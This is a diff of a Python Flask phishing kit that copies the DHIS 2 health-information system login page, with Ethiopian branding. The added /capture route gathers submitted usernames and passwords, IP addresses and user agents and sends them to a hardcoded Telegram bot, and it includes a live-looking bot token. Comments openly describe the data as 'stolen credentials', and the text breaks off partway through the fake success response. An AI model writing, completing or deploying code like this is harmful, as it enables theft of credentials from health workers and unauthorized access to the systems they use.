@@ -7,7 +7,7 @@ TELEGRAM_BOT_TOKEN = '8852974803:AAHgxTtXsIxJhG4N5z_XYGyQTeOLLIm-Ylw'
 TELEGRAM_CHAT_ID = '7586408670'
 # ========================
 
-app = Flask(__name__)
+app = Flask(__name__) # Fixed: Use __name__
 
 def send_to_telegram(text):
     """Sends stolen credentials to your Telegram"""
@@ -26,7 +26,7 @@ def send_to_telegram(text):
     except Exception as e:
         print(f"Exception while sending to Telegram: {e}")
 
-# The HTML template with embedded CSS to ensure a perfect look
+# The HTML template
 HTML_TEMPLATE = """
 <!DOCTYPE HTML>
 <html class="loginPage" dir="ltr">
@@ -35,18 +35,9 @@ HTML_TEMPLATE = """
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<!-- 
-    OPTION: If you want to try your downloaded CSS, uncomment these lines.
-    However, the inline <style> below is robust and will fix layout issues.
-    
-    <link rel="stylesheet" type="text/css" href="/static/css/login.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/widgets.css">
--->
-
 <script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>
 
 <style>
-    /* --- RESET & BASE --- */
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -57,7 +48,6 @@ HTML_TEMPLATE = """
         min-height: 100vh;
     }
 
-    /* --- HEADER (FLAG & TITLE) --- */
     .header-section {
         width: 100%;
         background-color: #fff;
@@ -80,7 +70,6 @@ HTML_TEMPLATE = """
         display: block;
     }
 
-    /* --- MAIN CONTENT AREA --- */
     #loginField {
         flex: 1;
         display: flex;
@@ -97,25 +86,22 @@ HTML_TEMPLATE = """
         box-shadow: 0 4px 15px rgba(0,0,0,0.1);
     }
     
-    /* --- LOGO AREA --- */
     #bannerArea {
         text-align: center;
         margin-bottom: 25px;
     }
     #bannerArea img {
         height: 50px;
-        width: auto;
+        width: auto; 
     }
-    /* Fallback if image fails to load */
     #textLogoFallback {
-        display: none; /* Hidden by default */
+        display: none;
         font-size: 32px;
         font-weight: 800;
         color: #0066cc;
         letter-spacing: -1px;
     }
 
-    /* --- FORM STYLES --- */
     #signInLabel {
         font-size: 18px;
         font-weight: 600;
@@ -139,7 +125,6 @@ HTML_TEMPLATE = """
         box-shadow: 0 0 5px rgba(0,102,204,0.2);
     }
     
-    /* --- BUTTON --- */
     #submitDiv {
         margin-top: 25px;
     }
@@ -159,7 +144,6 @@ HTML_TEMPLATE = """
         background-color: #004499;
     }
 
-    /* --- FOOTER --- */
     #footerArea {
         background-color: #fff;
         border-top: 1px solid #e0e0e0;
@@ -176,14 +160,23 @@ HTML_TEMPLATE = """
         text-decoration: underline;
     }
 </style>
+
+<script>
+    // Hide broken images and show fallbacks
+    $(document).ready(function(){
+        $('#mainLogo').on('error', function(){
+            $(this).hide();
+            $('#textLogoFallback').show();
+        });
+        
+        // Optional: Clear password field on load to prevent browser autocomplete issues
+        $('#j_password').val('');
+    });
+</script>
 </head>
 <body class="loginPage">
 
 <div class="header-section">
-    <!-- 
-        If you have the flag at /static/images/ethiopia.png, this will load. 
-        If not, it will be invisible, which is fine.
-    -->
     <img id="flagArea" src="/static/images/ethiopia.png" alt="Ethiopia Flag" onerror="this.style.display='none';">
     <span id="titleArea">DHIS 2</span>
 </div>
@@ -191,10 +184,6 @@ HTML_TEMPLATE = """
 <div id="loginField">
     <div id="loginArea">
         <div id="bannerArea">
-            <!-- 
-                Attempts to load your logo. If it fails (404), the JS below 
-                will hide the broken image and show the text "DHIS 2" instead.
-            -->
             <img id="mainLogo" src="/static/images/logo_front.png" alt="DHIS2 Logo">
             <div id="textLogoFallback">DHIS 2</div>
         </div>
@@ -208,4 +197,43 @@ HTML_TEMPLATE = """
                 <input type="password" id="j_password" name="j_password" autocomplete="off" placeholder="Password" required>
             </div>
             <div id="submitDiv">
-                <input id="submit" class
+                <input id="submit" class="button" type="submit" value="Sign in">
+            </div>
+        </form>
+    </div>
+</div>
+
+<div id="footerArea">
+    <span>Powered by </span><a href="https://www.dhis2.org" target="_blank">DHIS 2</a> &copy; 2024
+</div>
+
+</body>
+</html>
+"""
+
+@app.route('/', methods=['GET'])
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/capture', methods=['POST'])
+def capture():
+    username = request.form.get('j_username')
+    password = request.form.get('j_password')
+    
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Send to Telegram
+    telegram_msg = f"""
+<b>DHIS 2 Phish Captured</b>
+Time: {timestamp}
+IP: {request.remote_addr}
+User: {username}
+Pass: {password}
+UA: {request.headers.get('User-Agent')}
+    """
+    
+    send_to_telegram(telegram_msg)
+    
+    # Return a fake success page or redirect
+    # For testing, we'll just show a plain text message
+    return f"<h2>Signing you in...</h2><script>setTimeout(function()
